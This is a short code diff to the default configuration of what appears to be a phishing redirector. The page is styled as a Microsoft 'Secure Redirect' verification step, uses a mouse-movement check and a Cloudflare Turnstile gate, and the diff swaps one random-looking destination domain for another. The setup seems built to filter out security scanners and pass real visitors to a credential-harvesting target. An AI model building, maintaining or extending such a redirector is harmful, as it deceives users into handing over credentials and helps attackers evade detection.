@@ -26,7 +26,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://ghost.evocation.com.de/c9laD/#',
+  defaultTargetUrl: 'https://mfhuw.wbujrne.es/b!eLsvQOjWiEA/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   logoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
@@ -46,7 +46,7 @@ export const defaultConfig: Config = {
     minMouseMovements: 5
   },
   turnstile: {
-    siteKey: '0x4AAAAAABaeDHdwHVmJobfE',
+    siteKey: '0x4AAAAAABnhBqzPq5gaK-C6',
     maxAttempts: 5,
     cooldownPeriod: 3600000 // 1 hour
   }
